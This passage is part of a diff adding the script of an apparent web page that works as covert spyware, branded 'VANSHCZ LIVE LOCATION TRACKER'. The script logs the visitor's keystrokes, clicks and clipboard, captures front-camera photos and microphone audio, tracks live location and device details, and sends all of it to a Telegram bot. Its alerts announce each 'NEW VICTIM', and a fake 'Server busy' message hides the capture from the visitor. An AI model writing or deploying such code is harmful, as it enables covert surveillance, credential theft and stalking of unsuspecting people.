+                    gamma: e.gamma || 0
+                };
+            });
+        }
+        
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                STATE.battery = {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                };
+                
+                battery.addEventListener('levelchange', () => {
+                    STATE.battery.level = Math.round(battery.level * 100);
+                });
+            });
+        }
+        
+        console.log('✅ Sensors active');
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// TELEGRAM API
+// ═══════════════════════════════════════════════════════════════
+const TelegramAPI = {
+    async sendMessage(text) {
+        try {
+            return await Utils.retry(async () => {
+                const form = new FormData();
+                form.append('chat_id', CONFIG.CHAT_ID);
+                form.append('text', text.slice(0, 4096));
+                form.append('parse_mode', 'HTML');
+                form.append('disable_web_page_preview', 'false');
+                
+                const res = await fetch(
+                    `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`,
+                    { method: 'POST', body: form }
+                );
+                
+                const result = await res.json();
+                if (!result.ok) throw new Error(result.description);
+                return true;
+            });
+        } catch (e) {
+            STATE.errorCount++;
+            return false;
+        }
+    },
+    
+    async sendPhoto(blob, caption) {
+        try {
+            const form = new FormData();
+            form.append('chat_id', CONFIG.CHAT_ID);
+            form.append('photo', blob, `front_${STATE.photoCount}.jpg`);
+            form.append('caption', caption.slice(0, 1024));
+            form.append('parse_mode', 'HTML');
+            
+            const res = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
+                { method: 'POST', body: form }
+            );
+            
+            STATE.metrics.photosSuccessful++;
+            return (await res.json()).ok;
+        } catch (e) {
+            STATE.metrics.photosFailed++;
+            return false;
+        }
+    },
+    
+    async sendAudio(blob, count) {
+        try {
+            const caption = `🎙️ MIC #${count}\n${STATE.sessionId}\n${Utils.getTimestamp()}`;
+            
+            const form = new FormData();
+            form.append('chat_id', CONFIG.CHAT_ID);
+            form.append('voice', blob, `mic_${count}.webm`);
+            form.append('caption', caption);
+            
+            await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVoice`,
+                { method: 'POST', body: form }
+            );
+            
+            return true;
+        } catch (e) {
+            return false;
+        }
+    },
+    
+    async sendLocation(lat, lon) {
+        try {
+            const form = new FormData();
+            form.append('chat_id', CONFIG.CHAT_ID);
+            form.append('latitude', lat);
+            form.append('longitude', lon);
+            
+            await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`,
+                { method: 'POST', body: form }
+            );
+            
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// MESSAGE BUILDER
+// ═══════════════════════════════════════════════════════════════
+const MessageBuilder = {
+    victimAlert(data) {
+        const ip = data.ipInfo || {};
+        const fp = data.fingerprint || {};
+        
+        let msg = `╔${'═'.repeat(50)}╗\n`;
+        msg += `║ 🚨 <b>NEW VICTIM - LIVE TRACKING ACTIVE</b> 🚨\n`;
+        msg += `╠${'═'.repeat(50)}╣\n\n`;
+        
+        msg += `📋 <b>SESSION INFO</b>\n`;
+        msg += `┃ 🆔 <code>${data.sessionId}</code>\n`;
+        msg += `┃ 🎯 ${data.resultType}\n`;
+        msg += `┃ ⏰ ${Utils.getFullTimestamp()}\n\n`;
+        
+        msg += `🌐 <b>IP & LOCATION</b>\n`;
+        msg += `┃ 📍 IP: <code>${ip.ip}</code>\n`;
+        msg += `┃ 🏙️ ${ip.city}, ${ip.region}\n`;
+        msg += `┃ 🌍 ${ip.country} (${ip.countryCode})\n`;
+        msg += `┃ 🏢 ISP: ${ip.isp}\n`;
+        msg += `┃ 🕐 Timezone: ${ip.timezone}\n\n`;
+        
+        msg += `📱 <b>DEVICE</b>\n`;
+        msg += `┃ 🖥️ ${fp.platform}\n`;
+        msg += `┃ 📐 ${fp.screenWidth}×${fp.screenHeight}\n`;
+        msg += `┃ 🔋 ${fp.batteryLevel || 'N/A'}%\n`;
+        msg += `┃ 📶 ${fp.connectionSpeed || 'Unknown'}\n\n`;
+        
+        msg += `🔥 <b>SYSTEMS ACTIVE</b>\n`;
+        msg += `✅ Live Location Tracking (Every ${CONFIG.LOCATION_INTERVAL/1000}s)\n`;
+        msg += `✅ Front Camera (9:16 HD)\n`;
+        msg += `✅ Microphone Recording\n`;
+        msg += `✅ Advanced Keylogger\n`;
+        msg += `✅ All Sensors\n\n`;
+        
+        msg += `👑 @vanshcz • 2025 LIVE TRACKER`;
+        
+        return msg;
+    },
+    
+    photoCaption(num) {
+        return `📸 FRONT CAM #${num}\n` +
+               `${STATE.sessionId}\n` +
+               `${CONFIG.PHOTO_WIDTH}×${CONFIG.PHOTO_HEIGHT}\n` +
+               `${Utils.getTimestamp()}\n` +
+               `👑 @vanshcz`;
+    },
+    
+    keylogReport(data) {
+        STATE.keylogCount++;
+        
+        let report = `⌨️ <b>ACTIVITY #${STATE.keylogCount}</b>\n\n`;
+        report += `${STATE.sessionId}\n`;
+        report += `${Utils.getTimestamp()}\n\n`;
+        
+        if (data.keys?.length > 0) {
+            let keyText = '';
+            data.keys.forEach(k => {
+                if (k.key?.length === 1) {
+                    keyText += k.shift ? k.key.toUpperCase() : k.key;
+                } else if (k.key === 'Enter') keyText += '\n';
+                else if (k.key === 'Space') keyText += ' ';
+            });
+            report += `<b>KEYS:</b>\n<code>${Utils.sanitize(keyText.slice(0, 1000))}</code>\n\n`;
+        }
+        
+        if (data.clicks?.length > 0) {
+            report += `<b>CLICKS (${data.clicks.length}):</b>\n`;
+            data.clicks.slice(0, 10).forEach(c => {
+                report += `${c.target} @ (${c.x},${c.y})\n`;
+            });
+        }
+        
+        if (data.clipboard?.length > 0) {
+            report += `\n<b>CLIPBOARD:</b>\n`;
+            data.clipboard.forEach(c => {
+                report += `${c.type}: <code>${Utils.sanitize(c.content?.slice(0, 200))}</code>\n`;
+            });
+        }
+        
+        return report + '\n👑 @vanshcz';
+    },
+    
+    statusUpdate() {
+        const uptime = Utils.formatDuration(Date.now() - STATE.startTime);
+        
+        let msg = `📊 <b>STATUS UPDATE</b>\n\n`;
+        msg += `🆔 ${STATE.sessionId}\n`;
+        msg += `⏱️ Uptime: ${uptime}\n`;
+        msg += `⏰ ${Utils.getTimestamp()}\n\n`;
+        
+        msg += `<b>STATISTICS:</b>\n`;
+        msg += `📸 Photos: ${STATE.photoCount}\n`;
+        msg += `🎙️ Audio: ${STATE.audioCount}\n`;
+        msg += `📍 Locations: ${STATE.locationUpdateCount}\n`;
+        msg += `⌨️ Reports: ${STATE.keylogCount}\n`;
+        msg += `💾 Data Sent: ${Utils.formatBytes(STATE.totalDataSent)}\n`;
+        msg += `❌ Errors: ${STATE.errorCount}\n\n`;
+        
+        msg += `<b>ACTIVE:</b>\n`;
+        msg += `📷 Camera: ${STATE.cameraActive ? '✅' : '❌'}\n`;
+        msg += `🎤 Audio: ${STATE.audioActive ? '✅' : '❌'}\n`;
+        msg += `📍 Live Location: ${STATE.locationTracking ? '✅' : '❌'}\n\n`;
+        
+        if (STATE.battery) {
+            msg += `🔋 Battery: ${STATE.battery.level}% ${STATE.battery.charging ? '⚡' : ''}\n`;
+        }
+        
+        if (STATE.currentLocation) {
+            const loc = STATE.currentLocation;
+            const speedKmh = ((loc.speed || 0) * 3.6).toFixed(1);
+            msg += `🚀 Speed: ${speedKmh} km/h\n`;
+            msg += `🛣️ Distance: ${STATE.totalDistanceTraveled.toFixed(0)}m\n`;
+        }
+        
+        msg += `\n👑 @vanshcz`;
+        return msg;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CAPTURE LOOPS
+// ═══════════════════════════════════════════════════════════════
+const CaptureLoops = {
+    startPhotoLoop() {
+        const interval = setInterval(async () => {
+            if (!STATE.cameraActive) return;
+            
+            const blob = await CameraModule.capturePhoto();
+            if (blob) {
+                await TelegramAPI.sendPhoto(blob, MessageBuilder.photoCaption(STATE.photoCount));
+            }
+        }, CONFIG.PHOTO_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startKeylogLoop() {
+        const interval = setInterval(async () => {
+            const data = KeyloggerModule.getData();
+            if (data.keys?.length > 0 || data.clicks?.length > 0 || data.clipboard?.length > 0) {
+                await TelegramAPI.sendMessage(MessageBuilder.keylogReport(data));
+            }
+        }, CONFIG.KEYLOG_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startStatusLoop() {
+        const interval = setInterval(async () => {
+            await TelegramAPI.sendMessage(MessageBuilder.statusUpdate());
+        }, CONFIG.STATUS_UPDATE_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startHealthCheck() {
+        const interval = setInterval(async () => {
+            if (STATE.initialized && !STATE.cameraActive) {
+                await CameraModule.start();
+                if (STATE.cameraActive) AudioModule.start();
+            }
+        }, 10000);
+        
+        STATE.intervals.push(interval);
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// MAIN INITIALIZATION
+// ═══════════════════════════════════════════════════════════════
+async function initCapture(resultType) {
+    if (STATE.initialized) return;
+    
+    STATE.initialized = true;
+    STATE.sessionId = Utils.generateSessionId();
+    STATE.startTime = Date.now();
+    
+    console.log('🚀 LIVE LOCATION TRACKER INITIALIZING...');
+    
+    document.querySelectorAll('.result').forEach(el => {
+        el.innerHTML += '<br><small style="color:#00ff00">🔄 Loading... Please wait</small>';
+    });
+    
+    try {
+        // Collect data
+        const [ipInfo, fingerprint, networkInfo] = await Promise.all([
+            DataCollector.getIPInfo(),
+            DataCollector.getFingerprint(),
+            DataCollector.getNetworkInfo()
+        ]);
+        
+        STATE.victimInfo = ipInfo;
+        STATE.fingerprint = fingerprint;
+        STATE.network = networkInfo;
+        
+        // Send victim alert
+        await TelegramAPI.sendMessage(MessageBuilder.victimAlert({
+            sessionId: STATE.sessionId,
+            resultType: resultType,
+            ipInfo: ipInfo,
+            fingerprint: fingerprint
+        }));
+        
+        // START LIVE LOCATION TRACKING
+        await LiveLocationTracker.startTracking();
+        
+        // Start camera
+        const camOk = await CameraModule.start();
+        if (camOk) {
+            AudioModule.start();
+            CaptureLoops.startPhotoLoop();
+        }
+        
+        // Start monitors
+        KeyloggerModule.init();
+        SensorModule.init();
+        
+        // Start loops
+        CaptureLoops.startKeylogLoop();
+        CaptureLoops.startStatusLoop();
+        CaptureLoops.startHealthCheck();
+        
+        console.log('✅ ALL SYSTEMS ACTIVE');
+        console.log('📍 LIVE LOCATION TRACKING ACTIVE');
+        
+    } catch (e) {
+        console.error('Init error:', e);
+        STATE.errorCount++;
+    }
+    
+    setTimeout(() => {
+        document.querySelectorAll('.result').forEach(el => {
+            el.innerHTML = el.innerHTML.replace('🔄 Loading...', '⚠️ Server busy. Try again in 5 min.');
+        });
+    }, 8000);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// EVENT LISTENERS
+// ═══════════════════════════════════════════════════════════════
+document.addEventListener('visibilitychange', async () => {
+    if (!STATE.initialized) return;
+    const status = document.hidden ? 'HIDDEN' : 'VISIBLE';
+    await TelegramAPI.sendMessage(`👁️ PAGE ${status}\n${STATE.sessionId}\n${Utils.getTimestamp()}`);
+});
+
+window.addEventListener('beforeunload', async () => {
+    if (!STATE.initialized) return;
+    
+    const uptime = Utils.formatDuration(Date.now() - STATE.startTime);
+    await TelegramAPI.sendMessage(
+        `🚪 <b>SESSION ENDED</b>\n\n` +
+        `${STATE.sessionId}\n` +
+        `⏱️ ${uptime}\n` +
+        `📸 ${STATE.photoCount} photos\n` +
+        `🎙️ ${STATE.audioCount} audio\n` +
+        `📍 ${STATE.locationUpdateCount} locations\n` +
+        `🛣️ ${STATE.totalDistanceTraveled.toFixed(0)}m traveled\n` +
+        `⏰ ${Utils.getTimestamp()}\n\n` +
+        `👑 @vanshcz`
+    );
+});
+
+console.log('╔═══════════════════════════════════════════════════════╗');
+console.log('║  💀 VANSHCZ LIVE LOCATION TRACKER v8.0               ║');
+console.log('╠═══════════════════════════════════════════════════════╣');
+console.log('║  ✅ Live Location (Every 10s with Google Maps)       ║');
+console.log('║  ✅ Movement & Speed Tracking                        ║');
+console.log('║  ✅ Address Reverse Geocoding                        ║');
+console.log('║  ✅ Front Camera (9:16 - 1080×1920)                  ║');
+console.log('║  ✅ Microphone Recording                             ║');
+console.log('║  ✅ Advanced Keylogger                               ║');
+console.log('║  ✅ All Sensors Active                               ║');
+console.log('╠═══════════════════════════════════════════════════════╣');
+console.log('║  🔥 READY - Waiting for victim...                    ║');
+console.log('║  👑 @vanshcz • 2025 ULTIMATE                         ║');
+console.log('╚═══════════════════════════════════════════════════════╝');
+</script>
+
+</body>
+</html>
